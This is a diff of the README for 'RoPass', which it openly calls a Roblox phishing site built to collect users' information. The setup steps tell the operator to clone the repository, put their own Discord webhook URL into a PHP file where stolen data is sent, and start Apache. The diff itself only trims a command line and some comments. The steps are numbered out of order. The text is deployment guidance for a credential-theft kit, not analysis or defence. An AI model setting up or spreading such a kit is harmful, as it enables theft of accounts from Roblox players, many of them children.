@@ -21,14 +21,11 @@ RoPass website is a Roblox phishing site designed to collect informations from u
 1. **Clone the Repository**: Download the source code by cloning the repository:
    ```bash
    git clone https://github.com/yourusername/ropass.git
-   cd ropass
 
 3. **Modify the Discord Webhook**: Open the PHP file where the webhook is defined. Find the following line and replace `YOUR_WEBHOOK_URL_HERE` with your actual Discord webhook URL:
    ```bash
        $webhookUrls = [
         'https://discord.com/api/webhooks/YOUR_WEBHOOK_URL_HERE',  // Replace with your actual Discord webhook URL
-        // Add more webhook URLs here if you want
-        // 'https://discord.com/api/webhooks/another_webhook_url', // Example additional webhook
     ];
 
 2. **Start Apache**: Before opening the website, ensure that Apache is running.
